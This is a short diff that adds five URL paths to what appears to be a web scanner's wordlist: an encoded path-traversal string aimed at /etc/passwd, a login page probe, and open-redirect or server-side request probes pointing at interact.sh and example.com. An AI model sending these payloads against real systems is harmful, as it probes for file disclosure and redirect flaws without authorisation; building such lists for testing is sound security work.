@@ -1,0 +1,5 @@
+/static/..%5c..%5c..%5c..%5cetc/passwd
+/login.zul
+/http%3A%2F%2Fwww.interact.sh
+//example.com/%2F..
+//interact.sh/%2F..
